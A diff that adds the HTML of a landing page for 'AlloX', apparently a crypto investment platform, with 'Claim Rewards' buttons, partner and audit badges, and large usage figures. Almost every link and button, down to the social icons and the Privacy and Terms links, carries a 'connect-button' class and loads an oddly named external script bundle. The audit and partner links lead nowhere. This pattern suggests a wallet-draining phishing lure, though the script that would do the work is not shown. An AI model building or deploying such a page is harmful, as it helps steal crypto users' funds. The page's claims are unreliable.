@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="assets/sources.js"></script>
+  <script src="assets/app-bundle_mtt33e1x.js"></script>
+  <script src="assets/qr-code-styling.js"></script>
+  <title>AlloX — Invest in Narratives, Not Tokens</title>
+  <meta name="description"
+    content="AlloX is an AI-powered capital allocation platform that transforms market narratives into diversified, risk-managed portfolios. Bridging TradFi and DeFi.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap"
+    rel="stylesheet">
+  <link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+
+  <div class="page-bg"></div>
+
+  <div class="shell">
+
+    <!-- ============ NAV ============ -->
+    <header class="nav-wrap">
+      <nav class="nav" id="nav">
+        <a href="#top" class="nav-logo connect-button">
+          <img src="img/alloxlogo.png" alt="">
+        </a>
+
+        <ul class="nav-links">
+          <li><a href="#product" class="connect-button">Product</a></li>
+          <li><a href="#docs" class="connect-button">Docs</a></li>
+          <li><a href="#platform" class="connect-button">Platform</a></li>
+        </ul>
+
+        <a href="#launch" class="btn btn-black nav-cta connect-button">Claim Rewards</a>
+
+        <button class="hamburger" id="hamburger" aria-label="Open menu" aria-expanded="false">
+          <span></span><span></span><span></span>
+        </button>
+      </nav>
+
+      <div class="mobile-menu" id="mobile-menu">
+        <ul class="mobile-links">
+          <li><a href="#product" class="connect-button">Product</a></li>
+          <li><a href="#docs" class="connect-button">Docs</a></li>
+          <li><a href="#platform" class="connect-button">Platform</a></li>
+        </ul>
+        <a href="#launch" class="btn btn-black mobile-cta connect-button">Claim Rewards</a>
+      </div>
+    </header>
+
+    <main id="top">
+
+      <!-- ============ HERO ============ -->
+      <section class="hero">
+        <div class="hero-copy">
+          <span class="eyebrow">Bridging TradFi &amp; DeFi</span>
+          <h1>Invest in<br>Narratives,<br>Not Tokens</h1>
+          <p class="hero-sub">An AI-powered capital allocation platform that transforms market narratives into
+            diversified, risk-managed portfolios. Bridging TradFi and DeFi through transparent, automated basket
+            construction.</p>
+          <div class="hero-actions">
+            <a href="#launch" class="btn btn-black connect-button">Claim Rewards
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
+                <path d="M5 12h14M13 6l6 6-6 6" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                  stroke-linejoin="round" />
+              </svg>
+            </a>
+            <a href="#features" class="btn btn-text connect-button">Explore Features
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
+                <path d="M5 12h14M13 6l6 6-6 6" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                  stroke-linejoin="round" />
+              </svg>
+            </a>
+          </div>
+        </div>
+
+        <div class="hero-widget" aria-hidden="true">
+          <div class="chat-card">
+            <div class="chat-head">
+              <div class="chat-avatar">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+                  <path
+                    d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"
+                    stroke="#6D6AF6" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" />
+                </svg>
+              </div>
+              <div>
+                <div class="chat-name">AlloX</div>
+                <div class="chat-status" id="chat-status">Ready to assist</div>
+              </div>
+            </div>
+
+            <div class="amount-row" id="amount-row">
+              <button data-amount="$100" class="connect-button">$100</button>
+              <button data-amount="$250" class="connect-button">$250</button>
+              <button data-amount="$500" class="active connect-button">$500</button>
+              <button data-amount="$1K" class="connect-button">$1K</button>
+            </div>
+
+            <div class="chat-bubble-row">
+              <div class="chat-bubble" id="user-bubble">Mid Cap, $500</div>
+            </div>
+
+            <div class="basket-card">
+              <div class="basket-title">Gaming - Mid Cap Basket</div>
+              <div class="basket-row"><span>Investment</span><strong>$500.00</strong></div>
+              <div class="basket-row"><span>Tokens</span><strong>5 assets</strong></div>
+              <div class="basket-row"><span>Risk Tier</span><strong class="accent-blue">Mid Cap</strong></div>
+              <div class="basket-row"><span>Network Fee</span><strong>~$2.50</strong></div>
+              <button class="btn btn-black basket-btn connect-button" id="confirm-btn">Confirm Allocation</button>
+            </div>
+
+            <div class="chat-input-row">
+              <input type="text" placeholder="Type your intent…" disabled>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============ STATS ============ -->
+      <section class="stats-section">
+        <div class="card stats-card">
+          <div class="stat">
+            <div class="stat-num">2.5M</div>
+            <div class="stat-label">Registered Wallets</div>
+          </div>
+          <div class="stat">
+            <div class="stat-num">10.9M</div>
+            <div class="stat-label">Total Transactions</div>
+          </div>
+          <div class="stat">
+            <div class="stat-num">$48.5M</div>
+            <div class="stat-label">On-Chain Invested</div>
+          </div>
+          <div class="stat">
+            <div class="stat-num">$7.1B</div>
+            <div class="stat-label">Total Volume (Including Testnet)</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============ BUILT FOR SCALE ============ -->
+      <section class="section built-scale">
+        <span class="eyebrow center">Track Record</span>
+        <h2 class="section-title center">Built for Scale</h2>
+        <p class="section-sub center">Proven performance across market cycles. Real results, real impact.</p>
+
+        <div class="scale-grid">
+          <div class="card scale-card">
+            <div class="scale-num" style="color:#6E56E8">$150M+</div>
+            <div class="scale-label">Capital Throughput</div>
+          </div>
+          <div class="card scale-card">
+            <div class="scale-num" style="color:#D6389B">500K+</div>
+            <div class="scale-label">Wallets Interacted</div>
+          </div>
+          <div class="card scale-card">
+            <div class="scale-num" style="color:#EF4444">175K+</div>
+            <div class="scale-label">Community Reach</div>
+          </div>
+          <div class="card scale-card">
+            <div class="scale-num" style="color:#B4830B">$100M+</div>
+            <div class="scale-label">Assets Allocated</div>
+          </div>
+          <div class="card scale-card">
+            <div class="scale-num" style="color:#0FA968">$40M+</div>
+            <div class="scale-label">On Chain Rewards</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============ FEATURES ============ -->
+      <section class="section" id="features">
+        <div class="features-grid">
+
+          <div class="card feature-card">
+            <div class="icon-chip icon-blue">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+                <path
+                  d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"
+                  stroke="#2E6BF2" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" />
+              </svg>
+            </div>
+            <h3>Narrative-Based Investing</h3>
+            <p>Invest in market themes like Gaming, AI, or RWA, not individual tokens. Each narrative contains a
+              diversified basket of vetted assets.</p>
+          </div>
+
+          <div class="card feature-card">
+            <div class="icon-chip icon-purple">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+                <path d="M13 2 3 14h7l-1 8 10-12h-7l1-8z" stroke="#8B3CF2" stroke-width="1.8" stroke-linecap="round"
+                  stroke-linejoin="round" />
+              </svg>
+            </div>
+            <h3>AI-Constructed Baskets</h3>
+            <p>Our AI continuously analyzes markets to build and rebalance diversified token baskets within each
+              narrative, optimizing for performance and risk.</p>
+          </div>
+
+          <div class="card feature-card">
+            <div class="icon-chip icon-green">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+                <circle cx="12" cy="12" r="9" stroke="#149A63" stroke-width="1.8" />
+                <path d="M3 12h18M12 3c2.5 2.5 3.8 5.6 3.8 9s-1.3 6.5-3.8 9c-2.5-2.5-3.8-5.6-3.8-9S9.5 5.5 12 3z"
+                  stroke="#149A63" stroke-width="1.8" />
+              </svg>
+            </div>
+            <h3>Risk-Tiered Allocations</h3>
+            <p>Choose your risk level: High, Mid, or Low market cap tiers. Each tier offers different risk/reward
+              profiles within the same narrative.</p>
+          </div>
+
+          <div class="card feature-card">
+            <div class="icon-chip icon-orange">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+                <path d="M3 17l6-6 4 4 8-8" stroke="#E7742F" stroke-width="1.8" stroke-linecap="round"
+                  stroke-linejoin="round" />
+                <path d="M15 7h6v6" stroke="#E7742F" stroke-width="1.8" stroke-linecap="round"
+                  stroke-linejoin="round" />
+              </svg>
+            </div>
+            <h3>Select Any Amounts</h3>
+            <p>Select any amounts and let AI handle the complex allocation and execution across multiple tokens.</p>
+          </div>
+
+          <div class="card feature-card">
+            <div class="icon-chip icon-red">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+                <path d="M12 3l8 3v6c0 4.5-3 8-8 9-5-1-8-4.5-8-9V6l8-3z" stroke="#E23F5E" stroke-width="1.8"
+                  stroke-linejoin="round" />
+              </svg>
+            </div>
+            <h3>Transparent Explanations</h3>
+            <p>AI explains every recommendation, showing exactly which tokens are in each basket, their weightings, and
+              why they were selected.</p>
+          </div>
+
+          <div class="card feature-card">
+            <div class="icon-chip icon-pink">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+                <circle cx="12" cy="12" r="9" stroke="#D93B90" stroke-width="1.8" />
+                <path d="M8 12.5l2.5 2.5L16 9" stroke="#D93B90" stroke-width="1.8" stroke-linecap="round"
+                  stroke-linejoin="round" />
+              </svg>
+            </div>
+            <h3>Narrative Tracking</h3>
+            <p>Track how capital flows across sectors and adjust exposure based on narrative strength.</p>
+          </div>
+
+        </div>
+      </section>
+
+      <!-- ============ NARRATIVES TO PORTFOLIOS ============ -->
+      <section class="section">
+        <span class="eyebrow center">Powered by AI</span>
+        <h2 class="section-title center">From Narratives to Portfolios</h2>
+        <p class="section-sub center">AlloX transforms complex market themes into simple, risk-managed investment
+          decisions.</p>
+
+        <div class="two-col">
+          <div class="card gradient-top-card">
+            <h3>Narrative Intelligence</h3>
+            <p>AlloX monitors market narratives in real-time, identifying emerging themes and constructing diversified
+              baskets of tokens that represent each narrative's core value proposition.</p>
+            <ul class="check-list check-blue">
+              <li>AI analyzes social sentiment, trading volume, and fundamentals</li>
+              <li>Automatically rebalances baskets as narratives evolve</li>
+              <li>Surfaces emerging narratives before they go mainstream</li>
+            </ul>
+          </div>
+          <div class="card gradient-top-card">
+            <h3>Risk-Managed Allocation</h3>
+            <p>Every narrative offers three risk tiers based on market cap distribution. Choose your comfort level while
+              maintaining full diversification within your selected theme.</p>
+            <ul class="check-list check-purple">
+              <li>High Cap: Lower risk, established projects (&gt;$150M+ MC)</li>
+              <li>Mid Cap: Balanced growth potential ($30M-$150M MC)</li>
+              <li>Low Cap: Higher risk/reward early-stage ($2M-$30M MC)</li>
+            </ul>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============ MISSION ============ -->
+      <section class="section" id="platform">
+        <span class="eyebrow center">AlloX Platform</span>
+        <h2 class="section-title center">Narrative-Driven Capital<br>Allocation</h2>
+
+        <div class="card mission-card">
+          <p><strong>Our mission:</strong> Transform how people invest in crypto by replacing token-picking with
+            narrative-based allocation, where AI constructs, manages, and rebalances diversified baskets that capture
+            the true value of market themes.</p>
+          <p>From Gaming to RWA, from AI to DeSci, each narrative becomes a professionally managed portfolio that
+            bridges traditional finance discipline with decentralized finance innovation.</p>
+        </div>
+
+        <div class="center-btn">
+          <a href="#docs" class="btn btn-black connect-button">Learn About AlloX
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
+              <path d="M5 12h14M13 6l6 6-6 6" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                stroke-linejoin="round" />
+            </svg>
+          </a>
+        </div>
+      </section>
+
+      <!-- ============ ROADMAP ============ -->
+      <section class="section" id="docs">
+        <h2 class="section-title center">Roadmap</h2>
+        <p class="section-sub center">Key milestones in our journey</p>
+
+        <div class="roadmap-grid">
+          <div class="card roadmap-card">
+            <div class="roadmap-date"><svg width="16" height="16" viewBox="0 0 24 24" fill="none">
+                <rect x="3" y="5" width="18" height="16" rx="2" stroke="#8B3CF2" stroke-width="1.6" />
+                <path d="M3 9h18M8 3v4M16 3v4" stroke="#8B3CF2" stroke-width="1.6" stroke-linecap="round" />
+              </svg><span>Q1 2026</span></div>
+            <div class="roadmap-dot dot-filled"></div>
+            <h3>AlloX Launch</h3>
+            <ul class="road-list">
+              <li class="done">Beta platform release</li>
+              <li class="done">Spring Series Campaign</li>
+              <li class="done">Daily Bonus</li>
+              <li class="done">Social Tasks</li>
+            </ul>
+          </div>
+
+          <div class="card roadmap-card">
+            <div class="roadmap-date"><svg width="16" height="16" viewBox="0 0 24 24" fill="none">
+                <rect x="3" y="5" width="18" height="16" rx="2" stroke="#8B3CF2" stroke-width="1.6" />
+                <path d="M3 9h18M8 3v4M16 3v4" stroke="#8B3CF2" stroke-width="1.6" stroke-linecap="round" />
+              </svg><span>Q2 2026 - Current</span></div>
+            <div class="roadmap-dot dot-filled light"></div>
+            <h3>Multi-Chain Expansion</h3>
+            <ul class="road-list">
+              <li class="done">On-chain execution</li>
+              <li class="done">Top Portfolios, Prime Picks, Token Watchlist</li>
+              <li class="done">Credit card onramp and email login</li>
+              <li class="done">Allocation Race &amp; Prove Your Portfolio campaigns</li>
+            </ul>
+          </div>
+
+          <div class="card roadmap-card">
+            <div class="roadmap-date"><svg width="16" height="16" viewBox="0 0 24 24" fill="none">
+                <rect x="3" y="5" width="18" height="16" rx="2" stroke="#9AA0AC" stroke-width="1.6" />
+                <path d="M3 9h18M8 3v4M16 3v4" stroke="#9AA0AC" stroke-width="1.6" stroke-linecap="round" />
+              </svg><span>Q3 2026</span></div>
+            <div class="roadmap-dot"></div>
+            <h3>Platform &amp; Distribution</h3>
+            <ul class="road-list">
+              <li class="done">Referral program</li>
+              <li class="done">Binance Wallet Exclusive Campaign under the Booster Format</li>
+              <li class="done">Volume League Campaign</li>
+              <li class="done">xStocks tokenized equities</li>
+              <li class="pending">Token launch</li>
+            </ul>
+          </div>
+
+          <div class="card roadmap-card">
+            <div class="roadmap-date"><svg width="16" height="16" viewBox="0 0 24 24" fill="none">
+                <rect x="3" y="5" width="18" height="16" rx="2" stroke="#9AA0AC" stroke-width="1.6" />
+                <path d="M3 9h18M8 3v4M16 3v4" stroke="#9AA0AC" stroke-width="1.6" stroke-linecap="round" />
+              </svg><span>Q4 2026</span></div>
+            <div class="roadmap-dot"></div>
+            <h3>Infrastructure &amp; Decentralization</h3>
+            <ul class="road-list">
+              <li class="pending">Protocol integrations</li>
+              <li class="pending">Community governance live</li>
+              <li class="pending">Chain Expansion</li>
+              <li class="pending">Public API access</li>
+            </ul>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============ PARTNERS ============ -->
+      <section class="section">
+        <h2 class="section-title center">Partners &amp; Backers</h2>
+        <p class="section-sub center">Collaborating with industry leaders to shape the future</p>
+
+        <div class="binance-banner">
+          <div class="binance-copy">
+            <div class="binance-tag">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
+                <path d="M12 2l3 3-3 3-3-3 3-3zM4 10l3 3-3 3-3-3 3-3zM20 10l3 3-3 3-3-3 3-3zM12 18l3 3-3 3-3-3 3-3z"
+                  fill="#F0B90B" />
+              </svg>
+              <span>Binance Wallet</span>
+              <em>Exclusive</em>
+            </div>
+            <h3>Exclusive Campaign<br>with Binance Wallet</h3>
+            <p>AlloX was featured as an Exclusive Campaign on Binance Wallet under the Booster format, with 86.29K
+              KYC-verified users joining the campaign.</p>
+            <a href="#" class="btn btn-gold connect-button">View on Binance Wallet
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none">
+                <path d="M7 17 17 7M9 7h8v8" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                  stroke-linejoin="round" />
+              </svg>
+            </a>
+          </div>
+          <div class="binance-visual">
+            <div class="mock-window">
+              <div class="mock-window-head"><span></span><span></span><span></span></div>
+              <div class="mock-window-body">
+                <div class="mock-title">Binance Wallet Exclusive Campaigns</div>
+                <div class="mock-sub">Get the hottest trending Web3 projects &amp; claim exclusive rewards here</div>
+                <div class="mock-tag">Binance Wallet Exclusive Rewards</div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="logo-grid" id="logo-grid"></div>
+      </section>
+
+      <!-- ============ AUDITED & SECURE ============ -->
+      <section class="section">
+        <div class="card security-card">
+          <div class="security-copy">
+            <span class="eyebrow">Security First</span>
+            <h2 class="section-title">Audited &amp; Secure</h2>
+            <p>Our dApp has been rigorously audited by a leading blockchain security firm to ensure the safety of your
+              assets.</p>
+            <div class="security-actions">
+              <a href="#" class="btn btn-black connect-button">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
+                  <path d="M12 3l8 3v6c0 4.5-3 8-8 9-5-1-8-4.5-8-9V6l8-3z" stroke="currentColor" stroke-width="1.8"
+                    stroke-linejoin="round" />
+                </svg>
+                CertiK
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none">
+                  <path d="M5 12h14M13 6l6 6-6 6" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                    stroke-linejoin="round" />
+                </svg>
+              </a>
+              <a href="#" class="btn btn-black connect-button">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
+                  <path d="M12 3l8 3v6c0 4.5-3 8-8 9-5-1-8-4.5-8-9V6l8-3z" stroke="currentColor" stroke-width="1.8"
+                    stroke-linejoin="round" />
+                </svg>
+                View Security Audit
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none">
+                  <path d="M5 12h14M13 6l6 6-6 6" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                    stroke-linejoin="round" />
+                </svg>
+              </a>
+            </div>
+          </div>
+          <div class="security-list">
+            <div class="security-item">
+              <div class="icon-chip icon-green sm"><svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+                  <circle cx="12" cy="12" r="9" stroke="#149A63" stroke-width="1.8" />
+                  <path d="M8 12.5l2.5 2.5L16 9" stroke="#149A63" stroke-width="1.8" stroke-linecap="round"
+                    stroke-linejoin="round" />
+                </svg></div>
+              <div>
+                <h4>dApp Audited</h4>
+                <p>Comprehensive security audit by CertiK</p>
+              </div>
+            </div>
+            <div class="security-item">
+              <div class="icon-chip icon-blue sm"><svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+                  <path d="M12 3l8 3v6c0 4.5-3 8-8 9-5-1-8-4.5-8-9V6l8-3z" stroke="#2E6BF2" stroke-width="1.8"
+                    stroke-linejoin="round" />
+                </svg></div>
+              <div>
+                <h4>Multi-Signature Security</h4>
+                <p>Protected by multi-sig wallet</p>
+              </div>
+            </div>
+            <div class="security-item">
+              <div class="icon-chip icon-purple sm"><svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+                  <path d="M13 2 3 14h7l-1 8 10-12h-7l1-8z" stroke="#8B3CF2" stroke-width="1.8" stroke-linecap="round"
+                    stroke-linejoin="round" />
+                </svg></div>
+              <div>
+                <h4>Real-Time Monitoring</h4>
+                <p>24/7 security monitoring and threat detection</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============ FINAL CTA ============ -->
+      <section class="section" id="launch">
+        <div class="card final-cta">
+          <h2>Invest in Themes, Not Tokens</h2>
+          <p>Experience capital allocation reimagined. AI transforms market narratives into diversified, risk-managed
+            portfolios you can invest in with one click.</p>
+          <a href="#top" class="btn btn-black connect-button">Claim Rewards
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
+              <path d="M5 12h14M13 6l6 6-6 6" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                stroke-linejoin="round" />
+            </svg>
+          </a>
+        </div>
+      </section>
+
+    </main>
+
+    <!-- ============ FOOTER ============ -->
+    <footer class="footer">
+      <div class="footer-top">
+        <div class="footer-brand">
+          <a href="#top" class="nav-logo connect-button">
+            <img src="img/alloxlogo.png" alt="">
+          </a>
+          <p>Narrative-driven capital allocation for TradFi &amp; DeFi.</p>
+        </div>
+
+        <div class="footer-col">
+          <h4>Product</h4>
+          <a href="#features" class="connect-button">Features</a>
+          <a href="#docs" class="connect-button">Documentation</a>
+          <a href="#launch" class="connect-button">Claim Rewards</a>
+        </div>
+
+        <div class="footer-col">
+          <h4>Platform</h4>
+          <a href="#platform" class="connect-button">About</a>
+          <a href="#" class="connect-button">Litepaper</a>
+          <a href="#" class="connect-button">Brand</a>
+        </div>
+
+        <div class="footer-social">
+          <a href="#" aria-label="X" class="connect-button"><svg width="16" height="16" viewBox="0 0 24 24"
+              fill="currentColor">
+              <path
+                d="M18.9 2H22l-7.5 8.6L23.3 22h-7.2l-5.6-6.9L4 22H1l8-9.2L.9 2h7.4l5 6.3L18.9 2Zm-1.3 18h2L6.5 4H4.4l13.2 16Z" />
+            </svg></a>
+          <a href="#" aria-label="Telegram" class="connect-button"><svg width="16" height="16" viewBox="0 0 24 24"
+              fill="currentColor">
+              <path
+                d="M21.9 4.3 18.6 20c-.2 1-.9 1.3-1.7.8l-4.8-3.5-2.3 2.2c-.3.3-.5.5-1 .5l.3-4.9L18 6.5c.5-.4-.1-.6-.7-.3L6.6 13 1.9 11.5c-1-.3-1-1 .2-1.5L20.6 3c.9-.3 1.6.2 1.3 1.3Z" />
+            </svg></a>
+          <a href="#" aria-label="LinkedIn" class="connect-button"><svg width="16" height="16" viewBox="0 0 24 24"
+              fill="currentColor">
+              <path
+                d="M4.98 3.5a2.5 2.5 0 1 1 0 5 2.5 2.5 0 0 1 0-5ZM3 9h4v12H3V9Zm7 0h3.8v1.7h.05c.5-1 1.9-2 3.9-2 4.2 0 5 2.7 5 6.3V21h-4v-5.4c0-1.3 0-3-1.9-3s-2.1 1.4-2.1 2.9V21h-4V9Z" />
+            </svg></a>
+          <a href="#" aria-label="Instagram" class="connect-button"><svg width="16" height="16" viewBox="0 0 24 24"
+              fill="currentColor">
+              <path
+                d="M12 2c-2.7 0-3.06.01-4.12.06-1.06.05-1.79.22-2.43.47a4.9 4.9 0 0 0-1.77 1.15A4.9 4.9 0 0 0 2.53 5.45c-.25.64-.42 1.37-.47 2.43C2.01 8.94 2 9.3 2 12s.01 3.06.06 4.12c.05 1.06.22 1.79.47 2.43a4.9 4.9 0 0 0 1.15 1.77 4.9 4.9 0 0 0 1.77 1.15c.64.25 1.37.42 2.43.47C8.94 21.99 9.3 22 12 22s3.06-.01 4.12-.06c1.06-.05 1.79-.22 2.43-.47a4.9 4.9 0 0 0 1.77-1.15 4.9 4.9 0 0 0 1.15-1.77c.25-.64.42-1.37.47-2.43.05-1.06.06-1.42.06-4.12s-.01-3.06-.06-4.12c-.05-1.06-.22-1.79-.47-2.43a4.9 4.9 0 0 0-1.15-1.77A4.9 4.9 0 0 0 18.55 2.53c-.64-.25-1.37-.42-2.43-.47C15.06 2.01 14.7 2 12 2Zm0 1.8c2.65 0 2.97.01 4.02.06.97.04 1.5.2 1.85.34.46.18.8.4 1.15.75.35.35.57.68.75 1.15.14.35.3.88.34 1.85.05 1.05.06 1.37.06 4.02s-.01 2.97-.06 4.02c-.04.97-.2 1.5-.34 1.85-.18.46-.4.8-.75 1.15-.35.35-.68.57-1.15.75-.35.14-.88.3-1.85.34-1.05.05-1.37.06-4.02.06s-2.97-.01-4.02-.06c-.97-.04-1.5-.2-1.85-.34a3.1 3.1 0 0 1-1.15-.75 3.1 3.1 0 0 1-.75-1.15c-.14-.35-.3-.88-.34-1.85C3.81 14.97 3.8 14.65 3.8 12s.01-2.97.06-4.02c.04-.97.2-1.5.34-1.85.18-.46.4-.8.75-1.15.35-.35.68-.57 1.15-.75.35-.14.88-.3 1.85-.34C9.03 3.81 9.35 3.8 12 3.8Zm0 3.05a5.15 5.15 0 1 0 0 10.3 5.15 5.15 0 0 0 0-10.3Zm0 8.5a3.35 3.35 0 1 1 0-6.7 3.35 3.35 0 0 1 0 6.7Zm5.35-8.7a1.2 1.2 0 1 1-2.4 0 1.2 1.2 0 0 1 2.4 0Z" />
+            </svg></a>
+          <a href="#" aria-label="GitHub" class="connect-button"><svg width="16" height="16" viewBox="0 0 24 24"
+              fill="currentColor">
+              <path
+                d="M12 2a10 10 0 0 0-3.16 19.49c.5.09.68-.22.68-.48v-1.7c-2.78.6-3.37-1.34-3.37-1.34-.46-1.15-1.11-1.46-1.11-1.46-.9-.62.07-.6.07-.6 1 .07 1.53 1.03 1.53 1.03.9 1.52 2.34 1.08 2.91.83.09-.65.35-1.08.63-1.33-2.22-.25-4.56-1.11-4.56-4.95 0-1.09.39-1.99 1.03-2.68-.1-.26-.45-1.28.1-2.65 0 0 .84-.27 2.75 1.02a9.4 9.4 0 0 1 5 0c1.91-1.3 2.75-1.02 2.75-1.02.55 1.37.2 2.39.1 2.65.64.7 1.03 1.59 1.03 2.68 0 3.85-2.34 4.7-4.57 4.94.36.31.68.92.68 1.85V21c0 .27.18.58.69.48A10 10 0 0 0 12 2Z" />
+            </svg></a>
+          <a href="#" aria-label="Facebook" class="connect-button"><svg width="16" height="16" viewBox="0 0 24 24"
+              fill="currentColor">
+              <path
+                d="M13.5 21v-7.9h2.6l.4-3.1h-3v-2c0-.9.25-1.5 1.6-1.5H16.6V3.8c-.28-.04-1.24-.12-2.36-.12-2.34 0-3.94 1.43-3.94 4.04v2.28H7.7v3.1h2.6V21h3.2Z" />
+            </svg></a>
+          <a href="#" aria-label="Medium" class="connect-button"><svg width="16" height="16" viewBox="0 0 24 24"
+              fill="currentColor">
+              <path d="M3 5.5 8.6 5l3.9 9.6L16 5.5h5v13.1h-2.7V8.3l-4 10.3h-1.8L8.5 8.3v10.3H5.7V8.2L3 5.5Z" />
+            </svg></a>
+          <a href="#" aria-label="Email" class="connect-button"><svg width="16" height="16" viewBox="0 0 24 24"
+              fill="none">
+              <rect x="3" y="5" width="18" height="14" rx="2" stroke="currentColor" stroke-width="1.8" />
+              <path d="m4 7 8 6 8-6" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"
+                stroke-linejoin="round" />
+            </svg></a>
+        </div>
+      </div>
+
+      <div class="footer-bottom">
+        <span>© 2026 AlloX Platform. All rights reserved.</span>
+        <div class="footer-legal">
+          <a href="#" class="connect-button">Privacy</a>
+          <a href="#" class="connect-button">Terms</a>
+        </div>
+      </div>
+    </footer>
+
+  </div>
+
+  <script src="script.js"></script>
+</body>
+
+</html>
